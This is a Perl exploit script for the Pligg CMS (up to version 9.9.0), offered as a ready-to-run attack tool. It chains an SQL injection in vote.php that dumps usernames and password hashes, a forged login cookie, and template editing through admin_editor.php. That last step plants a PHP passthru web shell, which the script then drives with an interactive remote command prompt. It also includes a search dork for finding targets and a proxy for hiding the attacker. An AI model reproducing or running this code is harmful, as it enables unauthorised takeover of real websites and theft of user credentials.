Pligg <= 9.9.0 Remote Code Execution Exploit
============================================



#!/usr/bin/perl -w
use LWP::UserAgent;
use MIME::Base64;
use Digest::MD5 qw(md5_hex);
use Getopt::Std; getopts(&#039;h:&#039;, \%args);

print "#############################################\n";
print "# Pligg <= 9.9 Remote Code Execution Exploit \n";
print "#############################################\n";
#dork = "Powered By Pligg" + "Legal: License and Source"

# Proxy address
$ENV{http_proxy} = &#039;http://127.0.0.1:8118/&#039;;

my $http = LWP::UserAgent->new;
   $http->agent(&#039;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1&#039;);
   #$http->env_proxy(); # <-- uncomment for proxy
   $http->cookie_jar({});

my $host = $args{&#039;h&#039;} || usage(); # Host flag. Specify the Pligg root directory
my $user = undef;
my $pass = undef;
my $file = undef;
my $data = undef;
my @auth = undef;

# Details for the php code that is injected in to the template
my $ereg = &#039;<cmdout>(.*?)<\/cmdout>&#039;;
my $cvar = &#039;cmd&#039;;
my $cval = &#039;pwd;id&#039;;
my $code = &#039;<cmdout><?php if ( !empty($_REQUEST["&#039; . $cvar . &#039;"]) ) passthru($_REQUEST["&#039; . $cvar . &#039;"]); ?></cmdout>&#039;;

print "[*] Checking if a shell already exists ...\n";

$data = $http->post(
$host . &#039;/index.php&#039;,
[
   $cvar  => $cval
]); 

if ( $data->content =~ /$ereg/si ) 
{
	print "[*] Found existing shell ...\n";
}
else
{
	print "[!] No existing shell found ...\n";

	#############################################
	# Gather user info via vote.php SQL Injection
	#############################################

	$data = $http->post(
	$host . &#039;/vote.php&#039;,
	[
	   &#039;id&#039;  => &#039;-99 UNION SELECT 1,2,3,null,5,6,concat(user_login,char(58),user_pass),8,9 FROM pligg_users -- /*&#039;,
	   &#039;md5&#039; => &#039;d41d8cd98f00b204e9800998ecf8427e&#039; # <-- If you aren&#039;t logged in this always works
	]); 

	print "[*] Gathering user information ...\n";
		
	if ( $data->content =~ /(.*?):([a-f0-9]{1,64})/i )
	{
		$user = $1;
		$pass = $2;

		# Sets up the cookie to authenticate us
		@auth = (&#039;Cookie&#039; => &#039;mnm_user=&#039; . $user . &#039;; mnm_key=&#039; . encode_base64($user . &#039;:&#039; . crypt($user, 22) . &#039;:&#039; . md5_hex($pass)) . &#039;;&#039;);

		print "[+] Got user &#039;$user&#039; ...\n";

	}
	else
	{
		print "[!] Unable to get user info. Dumping output ...\n";
		open(ELOG, &#039;>pligg_debug.html&#039;);print ELOG $data->content;close(ELOG);
		exit;
	}

	#############################################
	# Get the template path
	#############################################

	print "[*] Gathering template information ...\n";

	$data = $http->get($host . &#039;/admin_editor.php&#039;,@auth); 

	if ( $data->content =~ />(.*?)<\/option>/i ) 
	{
		$file = $1;
		# Quick and dirty fix
		$file =~ s/admin_templates\/admin_access_denied.tpl/footer.tpl/;
		print "[+] Got template file [$file]...\n";
	}

	#############################################
	# Read the template contents
	#############################################

	$data = $http->post(
	$host . &#039;/admin_editor.php&#039;,
	[
	   &#039;the_file&#039;  => $file,
	   &#039;open&#039; => &#039;Open&#039;
	]
	,@auth); 

	print "[*] Reading template data ...\n";

	# Grab the template contents	
	if ( $data->content =~ /<textarea(.*)>(.*)<\/textarea>/is )
	{
		$temp = $2;
		$temp =~ s/>/>/ig;
		$temp =~ s/</</ig;
		$temp =~ s/"/"/ig;
		$temp =~ s/&/&/ig;

		print "[+] Got template data ...\n";
	}
	else
	{
		print "[!] Unable to get template data. Dumping output ...\n";
		open(ELOG, &#039;>pligg_debug.html&#039;);print ELOG $data->content;close(ELOG);
		exit;
	}

	#############################################
	# Update the Template Contents
	#############################################


	$data = $http->post(
	$host . &#039;/admin_editor.php&#039;,
	[
	   &#039;the_file2&#039;   => $file,
	   &#039;updatedfile&#039; => $temp . $code,
	   &#039;save&#039;        => &#039;Save+Changes&#039;
	]
	,@auth); 

	print "[*] Updating template data ...\n";

	if ( $data->content =~ /File Saved/is )
	{
		print "[+] File saved!\n";
	}
	else
	{
		print "[!] Unable to update template data. Dumping output ...\n";
		open(ELOG, &#039;>pligg_debug.html&#039;);print ELOG $data->content;close(ELOG);
		exit;
	}
}

#############################################
# Setting up the php shell
#############################################

print "[*] Setting up shell ...\n";

$data = $http->post(
$host . &#039;/index.php&#039;,
[
   $cvar  => $cval
]); 

if ( $data->content =~ /<cmdout>(.*?)<\/cmdout>/si ) 
{
	while ( 1 )
	{
		print "pligg:~#";
		$exec = <STDIN>;

		$data = $http->post(
		$host . &#039;/index.php&#039;,
		[
		   $cvar  => $exec
		]); 

		if ( $data->content =~ /$ereg/si ) 
		{
			print $1 . "\n";
		}
		else
		{
			print "Unexpected Response!\n";
		}
	}
}
else
{
	print "[!] Unable to set up shell ...\n";
	open(ELOG, &#039;>pligg_debug.html&#039;);print ELOG $data->content;close(ELOG);
	exit;
}

sub usage
{
	print "pligg_exploit.pl -h http://path/to/pligg     \n";
	exit;
}



